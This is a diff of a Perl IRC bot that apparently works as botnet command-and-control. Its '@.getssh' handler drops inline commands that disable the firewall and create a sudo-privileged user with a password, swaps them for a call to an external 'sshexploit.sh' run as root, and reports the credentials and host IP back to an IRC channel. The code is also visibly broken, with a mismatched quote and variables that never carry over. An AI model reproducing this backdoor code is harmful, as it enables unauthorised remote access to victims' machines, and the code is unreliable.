@@ -62,13 +62,8 @@ $irc->on(irc_privmsg => sub {
   system 'pkill python'; 
  }
   if ($msg =~ /@.getssh/) {
-  system "sudo iptables -F INPUT";
-  system "sudo iptables -P INPUT ACCEPT";
-  system "export US3R=$RANDOM";
-  system "export P4SSWD=$RANDOM";
-  system "sudo usermod -a -G sudo $US3R --password $P4SSWD";
-  system "export H0ST=$(hostname -i)+$(hostname -I)";
-  system "sudo service ssh restart';
+  system 'sudo sh sshexploit.sh';
+  system 'sudo source sshexploit.sh';
   $irc->write(notice => $noticechan => "9,1Added user: $US3R password: $P4SSWD on host:$H0ST");
  }
  elsif ($msg =~ /@.stopexploit/) {
